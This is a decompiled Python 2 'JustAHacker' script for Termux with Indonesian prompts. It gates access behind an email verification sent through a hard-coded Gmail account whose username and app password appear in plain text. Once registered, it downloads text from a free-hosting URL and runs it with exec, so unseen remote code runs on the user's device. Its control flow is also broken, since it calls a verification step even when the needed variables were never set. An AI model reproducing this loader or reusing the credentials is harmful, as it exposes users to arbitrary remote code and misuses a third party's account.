# uncompyle6 version 3.5.0
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <JustAHacker>
# Source code from crazy tools sTamdatez
import smtplib, os, sys, base64, random, time, requests
try:
    file = '/data/data/com.termux/files/usr/etc/justahackers.log'
    fileopen = open(file).read()
    a = base64.b64decode(fileopen)
    time.sleep(1)
    print '\x1b[1;32mSelamat Datang \x1b[1;33m' + a
    lnk = requests.get('https://justaserverscript.000webhostapp.com/crypto.txt').text
    time.sleep(3)
    exec lnk
except IOError:
    time.sleep(3)
    print '\x1b[1;36mMaaf Anda Belum Registrasi Script JustAHacker,Silahkan registrasi Dahulu '
    kode = random.randint(232658, 947364)
    fadd = 'rafasyahagung@gmail.com'
    namalu = raw_input('Nama Anda : ')
    tadd = raw_input('Masukkan Gmail Anda : ')
    print 'Kode Verifikasi 6 Angka Telah Dikirim ke ' + str(tadd)
    SUBJECT = 'Kode Verifikasi Script JustAHackers  '
    TEXT = 'Kode Verifikasi Script JustAHackers anda adalah ' + str(kode) + '\n\n\nSubscribe JustA Hacker'
    message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
    username = 'justabotsubs12@gmail.com'
    password = 'ohiabuebmpoeomqk'
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login(username, password)
    server.sendmail(fadd, tadd, message)
    os.system('am start com.google.android.gm')

def verif():
    os.system('clear')
    print '\x1b[1;35mMasukkan Kode Yang Telah Dikirim ke ' + str(tadd)
    print ''
    kodev = raw_input('\x1b[1;33mKode = ')
    if kodev == str(kode):
        print 'Verifikasi Berhasil... '
        time.sleep(2)
        regis()
    else:
        print 'Kode Yang Anda Masukkan Salah,Silahkan Cek Gmail anda Untuk kodenya'
        time.sleep(3)
        verif()


def regis():
    namalub = base64.b64encode(namalu)
    d = open('/data/data/com.termux/files/usr/etc/justahackers.log', 'w')
    d.write(namalub)
    d.close()
    os.system('python2 crypto.py')


if __name__ == '__main__':
    verif()
